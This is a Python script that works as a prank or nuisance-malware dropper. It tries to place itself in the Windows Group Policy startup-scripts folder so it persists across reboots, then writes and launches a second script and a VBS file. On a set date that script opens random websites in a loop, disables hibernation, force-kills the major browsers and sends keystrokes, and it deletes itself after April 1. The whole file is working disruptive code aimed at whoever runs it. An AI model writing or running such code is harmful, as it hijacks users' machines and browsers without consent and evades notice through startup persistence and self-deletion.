import os
try:
	os.chdir("C:/Windows/System32/GroupPolicy/Machine/Scripts/Startup")
	print("main")
	
except:
	try:
		os.chdir("C:/Users/Public/Documents")
		print("doc")
		
		
	except:
		try:
			os.chdir("C:/Python35")
		except:
			print("defalt directry not found")
			print("input new directry")
			os.chdir(input())
f=open("bing.py","w")
f.write('import datetime\nimport webbrowser\nimport os\nimport time\nimport random\ncounter=0\nx = datetime.datetime.now()\nif x.strftime("%m %d") == "03 20":\n	april=True\nelif int(x.strftime("%m%d")) >=int(401):\n        os.remove("K.VBS")\n        os.remove("bing.py")\n        exit\nelse:\n	april=False\n	print("not today")\nos.system("Powercfg -H OFF")\nbrake=random.randint(1, 20)\n')
f.write('print(brake)\nspear_url=["facebook.com","youtube.com","kgsorkney.com","wikipedia.org","baidu.com","hamishknox.co.uk","reddit.com","yahoo.com","coca-cola.co.uk","netflix.com"]')
f.write('\nwhile april == True:\n')
f.write('	webbrowser.open("www."+str(spear_url[random.randint(0, int(len(spear_url)-1))]))\n	counter=counter+1')
f.write('\n	for i in range(0,random.randint(1, 1)):\n')
f.write('		webbrowser.open("https://www.google.com/search?q=bing")\n')
f.write('	A=float(str(random.randint(2, 3))+str(".")+str(random.randint(1, 9)))\n')
f.write('	time.sleep(A)\n')
f.write('	if counter == brake:\n')
f.write('		os.system("start K.VBS")\n')
f.write('		print("long brake")\n')
f.write('		counter=0\n')
f.write('		brake=random.randint(1, 20)\n')
f.write('		time_to_brake=random.randint(60, 300)\n')
f.write('	os.system("TASKKILL /F /IM  Chrome.exe")\n')

f.write('	os.system("TASKKILL /F /IM  firefox.exe")\n')

f.write('	os.system("TASKKILL /F /IM  iexplore.exe")\n')

f.write('	os.system("TASKKILL /F /IM  Opera.exe")')

f.close()
k=open("K.VBS",'w')
k.write("WScript.Sleep(5000)\n")
k.write('Set objShell = CreateObject("WScript.Shell")\n')
k.write('objShell.SendKeys "{k}"')
k.close()
os.system("start bing.py")
